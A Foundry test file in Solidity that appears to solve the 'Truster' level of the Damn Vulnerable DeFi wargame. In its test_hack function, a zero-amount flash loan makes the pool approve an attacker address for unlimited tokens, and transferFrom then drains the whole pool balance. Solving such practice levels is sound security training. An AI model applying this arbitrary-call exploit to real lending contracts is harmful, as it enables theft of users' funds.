// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { Test, console } from "forge-std/Test.sol";
import {TrusterLenderPool} from "../src/TrusterLenderPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
contract TrusterLenderPoolTest is Test {

    TrusterLenderPool public trusterLenderPool;
    DamnValuableToken public token;
    uint256 borrowAmount = 100e18;
    uint256 approveAmount = 1000000e18;
    address admin = makeAddr("admin");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.startPrank(admin);
        token = new DamnValuableToken();
        trusterLenderPool = new TrusterLenderPool(token);
        token.transfer(address(trusterLenderPool), approveAmount);
        vm.stopPrank();
    }

    function test_hack() public {
        bool success = trusterLenderPool.flashLoan(0, hacker, address(token), abi.encodeWithSignature("approve(address,uint256)", hacker, type(uint256).max));
        require(success);
        console.log(token.allowance(address(trusterLenderPool), hacker));
        vm.prank(hacker);
        token.transferFrom(address(trusterLenderPool), hacker, approveAmount);
        assertEq(token.balanceOf(hacker), approveAmount);
    }

}